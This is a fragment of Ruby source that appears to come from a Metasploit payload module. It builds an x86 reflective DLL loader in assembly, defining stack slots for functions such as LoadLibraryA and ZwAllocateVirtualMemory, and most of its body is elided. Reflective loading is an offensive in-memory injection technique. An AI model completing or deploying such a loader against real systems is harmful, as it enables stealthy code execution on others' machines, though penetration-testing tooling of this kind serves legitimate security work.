...
module Msf::Payload::Windows::ReflectiveLoader
  def asm_reflective_loader(opts = {})
    ...
    # Stack frame %define replacements (ebp-based, 4-byte slots)
    pLoadLibraryA            = 'dword [ebp - 4]'
    pGetProcAddress          = 'dword [ebp - 8]'
    pZwAllocateVirtualMemory = 'dword [ebp - 12]'
    pNtFlushInstructionCache = 'dword [ebp - 16]'
    uiLibraryAddress         = 'dword [ebp - 20]'
    uiBaseAddress            = 'dword [ebp - 24]'
    uiHeaderValue            = 'dword [ebp - 28]'
    uiExportDir              = 'dword [ebp - 32]'
    uiNameArray              = 'dword [ebp - 36]'
    uiNameOrdinals           = 'dword [ebp - 40]'
    uiAddressArray           = 'dword [ebp - 44]'
    uiValueA                 = 'dword [ebp - 48]'
    uiValueB                 = 'dword [ebp - 52]'
    uiValueC                 = 'dword [ebp - 56]'
    uiValueD                 = 'dword [ebp - 60]'
    uiValueE                 = 'dword [ebp - 64]'
    usCounter                = 'dword [ebp - 68]'
    dwHashValue              = 'dword [ebp - 72]'
    pZwProtectVirtualMemory  = 'dword [ebp - 76]'
    ...
    step2:
        ...
        push    #{mem_reserve_commit}        ; arg5: AllocationType
    ...
    hfn_done:
        ret
    ^
    Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
  end
end
